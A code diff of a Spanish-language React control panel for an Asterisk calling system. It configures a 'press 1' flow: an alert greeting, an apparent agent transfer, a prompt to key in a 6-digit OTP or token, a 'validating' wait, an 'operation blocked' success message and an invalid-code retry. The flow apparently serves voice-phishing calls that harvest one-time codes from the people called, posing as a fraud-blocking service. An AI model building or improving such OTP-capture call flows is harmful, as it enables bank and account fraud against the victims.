@@ -4672,12 +4672,12 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         <span>Flujo Press-1 + OTP Automático Activo:</span>
                       </div>
                       <p className="text-[11px] text-slate-300">
-                        Al marcar <strong>1</strong>, dice: <em>"Un momento por favor, le estamos enviando su código de verificación"</em> (<code className="text-cyan-300 font-mono">{getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}</code>) y <strong>automáticamente</strong> pide digitar el OTP sin pulsar ningún botón.
+                        Al marcar <strong>1</strong>, reproduce <em>Transferencia a Asesor (Opción 1 - "Un momento por favor...")</em> (<code className="text-cyan-300 font-mono">{getServiceAudios(selectedService).agentAudioPath || 'custom/conectar_asesor'}</code>) y <strong>automáticamente</strong> pasa a pedir el código OTP sin pulsar ningún botón.
                       </p>
                     </div>
                     <button
                       type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion', 'single_otp_verify_wait')}
+                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).agentAudioPath || 'custom/conectar_asesor', 'single_otp_verify_wait')}
                       className="px-3 py-1.5 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-200 border border-cyan-500/40 text-xs font-bold flex items-center gap-1.5 shrink-0 cursor-pointer"
                     >
                       {playingAudioKey === 'single_otp_verify_wait' ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
@@ -5097,18 +5097,34 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                               </div>
                               <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                                 <span className="flex items-center gap-1 text-slate-300 shrink-0">
-                                  <Zap className="w-2.5 h-2.5 text-cyan-400" /> 2. Al Marcar 1:
+                                  <PhoneForwarded className="w-2.5 h-2.5 text-cyan-400" /> 2. Opción 1:
                                 </span>
-                                <span className="text-cyan-300 truncate font-semibold" title={ent.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}>
-                                  {(ent.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion').replace(/^custom\//, '')}
+                                <span className="text-cyan-300 truncate font-semibold" title={ent.agentAudioPath || 'custom/conectar_asesor'}>
+                                  {cleanAgent}
                                 </span>
                               </div>
-                              <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                              <div className="flex items-center justify-between gap-1 text-slate-400 truncate border-t border-slate-800/80 pt-1 mt-1">
                                 <span className="flex items-center gap-1 text-slate-300 shrink-0">
                                   <KeyRound className="w-2.5 h-2.5 text-purple-400" /> 3. Pedir OTP:
                                 </span>
                                 <span className="text-purple-300 truncate font-semibold" title={ent.promptAudioPath}>
                                   {cleanPrompt}
+                                </span>
+                              </div>
+                              <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                                <span className="flex items-center gap-1 text-slate-300 shrink-0">
+                                  <Clock className="w-2.5 h-2.5 text-indigo-400" /> 4. Espera:
+                                </span>
+                                <span className="text-indigo-300 truncate font-semibold" title={ent.waitAudioPath || 'custom/un_momento_validando_informacion'}>
+                                  {(ent.waitAudioPath || 'custom/un_momento_validando_informacion').replace(/^custom\//, '')}
+                                </span>
+                              </div>
+                              <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                                <span className="flex items-center gap-1 text-slate-300 shrink-0">
+                                  <CheckCircle2 className="w-2.5 h-2.5 text-emerald-400" /> 5. Éxito:
+                                </span>
+                                <span className="text-emerald-300 truncate font-semibold" title={ent.successAudioPath || 'custom/operacion_bloqueada_exito'}>
+                                  {(ent.successAudioPath || 'custom/operacion_bloqueada_exito').replace(/^custom\//, '')}
                                 </span>
                               </div>
                               <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
@@ -6223,7 +6239,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     : callFlowMode === 'cancel_code'
                     ? 'Si marca 1, reproduce "Un momento por favor, le estamos enviando un código de cancelación" y solicita los dígitos.'
                     : callFlowMode === 'otp_press1'
-                    ? 'Al marcar 1 reproduce "Le estamos enviando su código..." y pasa directo a pedir el OTP sin pulsar ningún botón.'
+                    ? 'Al marcar 1 reproduce Transferencia a Asesor (Opción 1) y pasa directo a pedir el código OTP sin pulsar ningún botón.'
                     : `Captura el código OTP ingresado o transfiere a la ${agentExtension} si presiona 1.`}
                 </div>
               </div>
@@ -6321,221 +6337,239 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             </div>
 
             {(callFlowMode === 'otp_press1' || activeSelectedEntity?.flowScope === 'otp_press1') ? (
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                {/* 1. Saludo Inicial */}
-                <div className="p-4 rounded-xl bg-slate-900 border border-emerald-500/30 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <label className="text-xs font-bold text-emerald-200 flex items-center gap-2">
-                      <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
-                      <span>1. Saludo Inicial (Pide marcar 1)</span>
-                    </label>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).introAudioPath, 'intro')}
-                      disabled={!getServiceAudios(selectedService).introAudioPath}
-                      className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    >
-                      {playingAudioKey === 'intro' ? <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
-                      <span>{playingAudioKey === 'intro' ? 'Pausar' : 'Escuchar'}</span>
-                    </button>
+              <div className="space-y-5">
+                {/* Bloque Superior: 2 audios de Saludo + Opción 1 */}
+                <div className="space-y-3">
+                  <div className="text-xs font-bold text-cyan-300 uppercase tracking-wider flex items-center gap-2">
+                    <Zap className="w-3.5 h-3.5 text-cyan-400" />
+                    <span>Paso Inicial: Saludo y Opción 1</span>
                   </div>
-                  <select
-                    value={getServiceAudios(selectedService).introAudioPath}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
-                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
-                  >
-                    <option value="custom/bienvenida_corporativa">custom/bienvenida_corporativa (Predeterminado)</option>
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                    ))}
-                  </select>
-                  <input
-                    type="text"
-                    value={getServiceAudios(selectedService).introAudioPath}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
-                    placeholder="ej: custom/bienvenida_corporativa"
-                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
-                  />
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    {/* 1. Saludo / Alerta Inicial (Intro) */}
+                    <div className="p-4 rounded-xl bg-slate-900 border border-emerald-500/30 space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold text-emerald-200 flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
+                          <span>1. Saludo / Alerta Inicial (Intro)</span>
+                        </label>
+                        <button
+                          type="button"
+                          onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).introAudioPath, 'intro')}
+                          disabled={!getServiceAudios(selectedService).introAudioPath}
+                          className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                        >
+                          {playingAudioKey === 'intro' ? <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
+                          <span>{playingAudioKey === 'intro' ? 'Pausar' : 'Escuchar'}</span>
+                        </button>
+                      </div>
+                      <select
+                        value={getServiceAudios(selectedService).introAudioPath}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
+                        className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
+                      >
+                        <option value="custom/bienvenida_corporativa">custom/bienvenida_corporativa (Predeterminado)</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                        ))}
+                      </select>
+                      <input
+                        type="text"
+                        value={getServiceAudios(selectedService).introAudioPath}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
+                        placeholder="ej: custom/bienvenida_corporativa"
+                        className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
+                      />
+                    </div>
+
+                    {/* 2. Transferencia a Asesor (Opción 1 - "Un momento por favor...") */}
+                    <div className="p-4 rounded-xl bg-slate-900 border border-cyan-500/40 space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold text-cyan-200 flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-cyan-400"></span>
+                          <span>2. Transferencia a Asesor (Opción 1 - "Un momento por favor...")</span>
+                        </label>
+                        <button
+                          type="button"
+                          onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).agentAudioPath || 'custom/conectar_asesor', 'agent')}
+                          className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                        >
+                          {playingAudioKey === 'agent' ? <Pause className="w-3.5 h-3.5 text-cyan-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
+                          <span>{playingAudioKey === 'agent' ? 'Pausar' : 'Escuchar'}</span>
+                        </button>
+                      </div>
+                      <select
+                        value={getServiceAudios(selectedService).agentAudioPath || 'custom/conectar_asesor'}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
+                        className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-cyan-500 font-mono"
+                      >
+                        <option value="custom/conectar_asesor">custom/conectar_asesor (Predeterminado)</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                        ))}
+                      </select>
+                      <input
+                        type="text"
+                        value={getServiceAudios(selectedService).agentAudioPath || 'custom/conectar_asesor'}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
+                        placeholder="ej: custom/conectar_asesor"
+                        className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-cyan-500 focus:outline-none"
+                      />
+                    </div>
+                  </div>
                 </div>
 
-                {/* 2. Al Marcar 1 (Enviando código) */}
-                <div className="p-4 rounded-xl bg-slate-900 border border-cyan-500/40 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <label className="text-xs font-bold text-cyan-200 flex items-center gap-2">
-                      <span className="w-2 h-2 rounded-full bg-cyan-400"></span>
-                      <span>2. Al Marcar 1 ("Le estamos enviando su código...")</span>
-                    </label>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion', 'otp_verify_wait')}
-                      className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    >
-                      {playingAudioKey === 'otp_verify_wait' ? <Pause className="w-3.5 h-3.5 text-cyan-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
-                      <span>{playingAudioKey === 'otp_verify_wait' ? 'Pausar' : 'Escuchar'}</span>
-                    </button>
+                {/* Bloque Inferior: 4 audios para pedir y validar el OTP */}
+                <div className="space-y-3 pt-4 border-t border-slate-800">
+                  <div className="text-xs font-bold text-purple-300 uppercase tracking-wider flex items-center gap-2">
+                    <KeyRound className="w-3.5 h-3.5 text-purple-400" />
+                    <span>Para Pedir y Validar el Código OTP</span>
                   </div>
-                  <select
-                    value={getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'otpVerifyWaitAudioPath', e.target.value)}
-                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-cyan-500 font-mono"
-                  >
-                    <option value="custom/enviando_codigo_verificacion">custom/enviando_codigo_verificacion (Predeterminado)</option>
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                    ))}
-                  </select>
-                  <input
-                    type="text"
-                    value={getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'otpVerifyWaitAudioPath', e.target.value)}
-                    placeholder="ej: custom/enviando_codigo_verificacion"
-                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-cyan-500 focus:outline-none"
-                  />
-                </div>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    {/* 3. Solicitud de Código OTP / Bienvenida */}
+                    <div className="p-4 rounded-xl bg-slate-900 border border-purple-500/30 space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold text-purple-200 flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-purple-400"></span>
+                          <span>3. Solicitud de Código OTP / Bienvenida</span>
+                        </label>
+                        <button
+                          type="button"
+                          onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).promptAudioPath, 'prompt')}
+                          disabled={!getServiceAudios(selectedService).promptAudioPath}
+                          className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                        >
+                          {playingAudioKey === 'prompt' ? <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
+                          <span>{playingAudioKey === 'prompt' ? 'Pausar' : 'Escuchar'}</span>
+                        </button>
+                      </div>
+                      <select
+                        value={getServiceAudios(selectedService).promptAudioPath}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
+                        className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                      >
+                        <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos [RECOMENDADO]</option>
+                        <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos</option>
+                        <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                        ))}
+                      </select>
+                      <input
+                        type="text"
+                        value={getServiceAudios(selectedService).promptAudioPath}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
+                        placeholder="ej: custom/prompt_otp_6_digitos"
+                        className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-purple-500 focus:outline-none"
+                      />
+                    </div>
 
-                {/* 3. Solicitar Código OTP */}
-                <div className="p-4 rounded-xl bg-slate-900 border border-purple-500/30 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <label className="text-xs font-bold text-purple-200 flex items-center gap-2">
-                      <span className="w-2 h-2 rounded-full bg-purple-400"></span>
-                      <span>3. Pedir Digitar el Código OTP</span>
-                    </label>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).promptAudioPath, 'prompt')}
-                      disabled={!getServiceAudios(selectedService).promptAudioPath}
-                      className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    >
-                      {playingAudioKey === 'prompt' ? <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
-                      <span>{playingAudioKey === 'prompt' ? 'Pausar' : 'Escuchar'}</span>
-                    </button>
-                  </div>
-                  <select
-                    value={getServiceAudios(selectedService).promptAudioPath}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
-                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
-                  >
-                    <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos [RECOMENDADO]</option>
-                    <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos</option>
-                    <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                    ))}
-                  </select>
-                  <input
-                    type="text"
-                    value={getServiceAudios(selectedService).promptAudioPath}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
-                    placeholder="ej: custom/prompt_otp_6_digitos"
-                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-purple-500 focus:outline-none"
-                  />
-                </div>
+                    {/* 4. Espera de Validación */}
+                    <div className="p-4 rounded-xl bg-slate-900 border border-indigo-500/40 space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold text-indigo-200 flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-indigo-400"></span>
+                          <span>4. Espera de Validación</span>
+                        </label>
+                        <button
+                          type="button"
+                          onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion', 'wait_slot')}
+                          className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                        >
+                          {playingAudioKey === 'wait_slot' ? <Pause className="w-3.5 h-3.5 text-indigo-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
+                          <span>{playingAudioKey === 'wait_slot' ? 'Pausar' : 'Escuchar'}</span>
+                        </button>
+                      </div>
+                      <select
+                        value={getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion'}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'waitAudioPath', e.target.value)}
+                        className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-indigo-500 font-mono"
+                      >
+                        <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion (Predeterminado)</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                        ))}
+                      </select>
+                      <input
+                        type="text"
+                        value={getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion'}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'waitAudioPath', e.target.value)}
+                        placeholder="ej: custom/un_momento_validando_informacion"
+                        className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-indigo-500 focus:outline-none"
+                      />
+                    </div>
 
-                {/* 4. Validando Información */}
-                <div className="p-4 rounded-xl bg-slate-900 border border-indigo-500/40 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <label className="text-xs font-bold text-indigo-200 flex items-center gap-2">
-                      <span className="w-2 h-2 rounded-full bg-indigo-400"></span>
-                      <span>4. Validando Información (Espera Decisión)</span>
-                    </label>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion', 'wait_slot')}
-                      className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    >
-                      {playingAudioKey === 'wait_slot' ? <Pause className="w-3.5 h-3.5 text-indigo-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
-                      <span>{playingAudioKey === 'wait_slot' ? 'Pausar' : 'Escuchar'}</span>
-                    </button>
-                  </div>
-                  <select
-                    value={getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion'}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'waitAudioPath', e.target.value)}
-                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-indigo-500 font-mono"
-                  >
-                    <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion (Predeterminado)</option>
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                    ))}
-                  </select>
-                  <input
-                    type="text"
-                    value={getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion'}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'waitAudioPath', e.target.value)}
-                    placeholder="ej: custom/un_momento_validando_informacion"
-                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-indigo-500 focus:outline-none"
-                  />
-                </div>
+                    {/* 5. Código Aprobado / Éxito */}
+                    <div className="p-4 rounded-xl bg-slate-900 border border-emerald-500/40 space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold text-emerald-200 flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
+                          <span>5. Código Aprobado / Éxito</span>
+                        </label>
+                        <button
+                          type="button"
+                          onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).successAudioPath, 'success')}
+                          disabled={!getServiceAudios(selectedService).successAudioPath}
+                          className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                        >
+                          {playingAudioKey === 'success' ? <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
+                          <span>{playingAudioKey === 'success' ? 'Pausar' : 'Escuchar'}</span>
+                        </button>
+                      </div>
+                      <select
+                        value={getServiceAudios(selectedService).successAudioPath}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
+                        className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
+                      >
+                        <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito (Predeterminado)</option>
+                        <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                        ))}
+                      </select>
+                      <input
+                        type="text"
+                        value={getServiceAudios(selectedService).successAudioPath}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
+                        placeholder="ej: custom/operacion_bloqueada_exito"
+                        className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
+                      />
+                    </div>
 
-                {/* 5. Código Válido / Éxito */}
-                <div className="p-4 rounded-xl bg-slate-900 border border-emerald-500/40 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <label className="text-xs font-bold text-emerald-200 flex items-center gap-2">
-                      <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
-                      <span>5. Código Válido / Éxito Final</span>
-                    </label>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).successAudioPath, 'success')}
-                      disabled={!getServiceAudios(selectedService).successAudioPath}
-                      className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    >
-                      {playingAudioKey === 'success' ? <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
-                      <span>{playingAudioKey === 'success' ? 'Pausar' : 'Escuchar'}</span>
-                    </button>
+                    {/* 6. Código Inválido / Reintento */}
+                    <div className="p-4 rounded-xl bg-slate-900 border border-rose-500/40 space-y-3">
+                      <div className="flex items-center justify-between">
+                        <label className="text-xs font-bold text-rose-200 flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-rose-400"></span>
+                          <span>6. Código Inválido / Reintento</span>
+                        </label>
+                        <button
+                          type="button"
+                          onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente', 'failure_slot')}
+                          className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                        >
+                          {playingAudioKey === 'failure_slot' ? <Pause className="w-3.5 h-3.5 text-rose-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
+                          <span>{playingAudioKey === 'failure_slot' ? 'Pausar' : 'Escuchar'}</span>
+                        </button>
+                      </div>
+                      <select
+                        value={getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente'}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'failureAudioPath', e.target.value)}
+                        className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-rose-500 font-mono"
+                      >
+                        <option value="custom/token_invalido_reintente">custom/token_invalido_reintente (Predeterminado)</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
+                        ))}
+                      </select>
+                      <input
+                        type="text"
+                        value={getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente'}
+                        onChange={(e) => handleUpdateCampaignAudio(selectedService, 'failureAudioPath', e.target.value)}
+                        placeholder="ej: custom/token_invalido_reintente"
+                        className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-rose-500 focus:outline-none"
+                      />
+                    </div>
                   </div>
-                  <select
-                    value={getServiceAudios(selectedService).successAudioPath}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
-                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
-                  >
-                    <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito (Predeterminado)</option>
-                    <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                    ))}
-                  </select>
-                  <input
-                    type="text"
-                    value={getServiceAudios(selectedService).successAudioPath}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
-                    placeholder="ej: custom/operacion_bloqueada_exito"
-                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
-                  />
-                </div>
-
-                {/* 6. Código Inválido / Reintentar */}
-                <div className="p-4 rounded-xl bg-slate-900 border border-rose-500/40 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <label className="text-xs font-bold text-rose-200 flex items-center gap-2">
-                      <span className="w-2 h-2 rounded-full bg-rose-400"></span>
-                      <span>6. Código Inválido / Reintento</span>
-                    </label>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente', 'failure_slot')}
-                      className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    >
-                      {playingAudioKey === 'failure_slot' ? <Pause className="w-3.5 h-3.5 text-rose-400 animate-pulse" /> : <Play className="w-3.5 h-3.5 text-slate-300" />}
-                      <span>{playingAudioKey === 'failure_slot' ? 'Pausar' : 'Escuchar'}</span>
-                    </button>
-                  </div>
-                  <select
-                    value={getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente'}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'failureAudioPath', e.target.value)}
-                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-rose-500 font-mono"
-                  >
-                    <option value="custom/token_invalido_reintente">custom/token_invalido_reintente (Predeterminado)</option>
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>{a.name} ({a.asteriskPath})</option>
-                    ))}
-                  </select>
-                  <input
-                    type="text"
-                    value={getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente'}
-                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'failureAudioPath', e.target.value)}
-                    placeholder="ej: custom/token_invalido_reintente"
-                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-rose-500 focus:outline-none"
-                  />
                 </div>
               </div>
             ) : (
@@ -7151,11 +7185,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 >
